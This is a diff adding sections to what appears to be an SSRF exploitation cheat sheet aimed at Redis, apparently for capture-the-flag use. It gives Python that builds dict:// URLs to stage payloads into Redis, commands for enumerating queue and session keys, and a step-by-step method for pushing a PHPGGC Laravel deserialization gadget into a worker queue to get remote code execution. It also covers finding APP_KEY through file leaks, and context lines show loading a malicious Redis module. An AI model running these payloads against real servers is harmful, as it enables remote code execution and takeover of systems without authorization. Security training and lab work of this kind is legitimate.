@@ -248,6 +248,35 @@ url = "dict://127.0.0.1:6379/" + quote("GET flag", safe="")
 print(base64.b64encode(url.encode()).decode())
 ```
 
+When the value is a large JSON/job payload, do not fight one giant `LPUSH queue JSON` by hand. Stage the value into a temporary Redis key with multiple `APPEND` requests, then atomically push the temp value into the queue with one `EVAL`.
+
+```python
+from urllib.parse import quote
+
+def redis_inline_arg(s):
+    # Redis inline protocol quoted string. Good for JSON/chunks without raw newlines.
+    return '"' + s.replace("\\", "\\\\").replace('"', '\\"') + '"'
+
+def dict_cmd(*argv):
+    line = " ".join(
+        a if a.isalnum() or all(c not in a for c in ' \t"\\') else redis_inline_arg(a)
+        for a in argv
+    )
+    return "dict://127.0.0.1:6379/" + quote(line, safe="")
+
+def dict_lpush_large(list_key, value, tmp="ssrf:tmp", chunk=700):
+    urls = [dict_cmd("DEL", tmp)]
+    for i in range(0, len(value), chunk):
+        urls.append(dict_cmd("APPEND", tmp, value[i:i+chunk]))
+    lua = "redis.call('lpush',KEYS[1],redis.call('get',KEYS[2]));redis.call('del',KEYS[2]);return 1"
+    urls.append(dict_cmd("EVAL", lua, "2", list_key, tmp))
+    return urls
+
+job_json = '{"uuid":"...","job":"...","data":{"command":"SERIALIZED_PHP_OBJECT"}}'
+for u in dict_lpush_large("queues:default", job_json):
+    print(u)
+```
+
 ## Redis via HTTP CRLF
 
 Sometimes gopher is blocked, but the SSRF sink allows `http://127.0.0.1:6379/...` and decodes `%0d%0a` in the path before sending the request. Redis accepts inline commands line by line, so the first HTTP line may error, then injected Redis commands still run.
@@ -336,6 +365,66 @@ CONFIG SET dir /tmp
 CONFIG SET dbfilename exp.so
 MODULE LOAD /tmp/exp.so
 ```
+
+## Redis App-Consumed Gadgets
+
+Use this when Redis is not writable to a useful filesystem path, but a worker consumes Redis data. The Redis bug is only delivery; the RCE primitive is the app's queue/session/cache deserializer.
+
+Common targets:
+
+```text
+Laravel queue worker: queues:default, laravel_queues:default, QUEUE_PREFIX:queues:default
+PHP sessions/cache: keys containing session, cache, laravel_cache
+Python workers: rq:queue:*, celery, pickle/base64 blobs
+Node workers: bull:* / bullmq:* jobs with JSON command handlers
+Sidekiq/Rails: queue:* JSON jobs, signed/encrypted payloads may need app secrets
+```
+
+Enumeration through SSRF:
+
+```text
+KEYS *queue*
+KEYS *session*
+KEYS *cache*
+LRANGE queues:default 0 -1
+TYPE KEY
+GET KEY
+HGETALL KEY
+```
+
+Laravel/PHP queue pattern:
+
+```text
+1. Pull one real queue item with LRANGE so you preserve the exact JSON schema.
+2. Check composer.lock/vendor versions and choose a matching PHPGGC gadget.
+3. Replace only the serialized command/object field; keep queue metadata believable.
+4. Push the job with RPUSH/LPUSH to the same list the worker reads.
+5. Wait for the worker, or trigger queue:work / schedule / webhook if the app exposes it.
+```
+
+PHPGGC:
+
+```bash
+git clone https://github.com/ambionics/phpggc
+cd phpggc
+php phpggc -l Laravel
+php phpggc Laravel/RCE1 system 'id'
+php phpggc Laravel/RCE1 system 'cat /flag* > public/flag.txt'
+```
+
+Laravel queue JSON is version/app specific, so copy the shape from Redis instead of using a fixed template. The important field is usually under `data.command`; it may be a raw PHP serialized object, or an encrypted Laravel envelope if the job is encrypted. If it is encrypted, look for `APP_KEY` through LFI, `.env`, config leaks, debug pages, backups, or source.
+
+Dict delivery for Laravel queues:
+
+```text
+# Small job, if quoting survives the SSRF sink:
+dict://127.0.0.1:6379/LPUSH%20queues%3Adefault%20%22%7B...json...%7D%22
+
+# Large or quote-heavy job:
+Use the APPEND + EVAL staging snippet from Redis via dict.
+```
+
+Do not confuse this with PHP-CGI/FastCGI. PHP-CGI/FastCGI is a separate SSRF pivot to a PHP interpreter port/socket. Redis queue exploitation needs a PHP POP gadget because the Laravel/PHP worker unserializes attacker-controlled queue data.
 
 Reality checks:
 
